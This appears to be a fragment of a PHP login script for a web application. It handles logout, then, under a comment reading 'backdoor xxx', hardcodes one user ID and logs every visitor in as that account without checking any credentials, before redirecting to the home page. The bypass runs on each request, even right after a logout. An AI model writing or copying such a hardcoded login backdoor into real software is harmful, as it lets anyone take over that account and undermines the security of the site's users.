<?php

//if this parameter is sent in the url, then the users wants to disconnect
if(isset($_GET['action']) && $_GET['action'] == 'logout')
{
    //destroy and recreate the session
    unset($_SESSION);
    session_destroy();
    session_start();

    //destroy the connection cookie
} 


//backdoor xxx
$userid = "106807772820961709282";

        // check if user exists (login user)
        $account = new Account($database, $log, $userid);
        $accountAlreadyExists = "0";
        $accountAlreadyExists = $account->checkIfAccountExists();

        // if yes, login then header to home
        if ($accountAlreadyExists == "1")
        {
            // Regenerate the session to prevent security risks
            session_destroy();
            session_start();    

            //get player data
            $account->loginUser();

            // return OK
            header("Location: index.php?page=home");
            // echo '1';
            // die; 
        }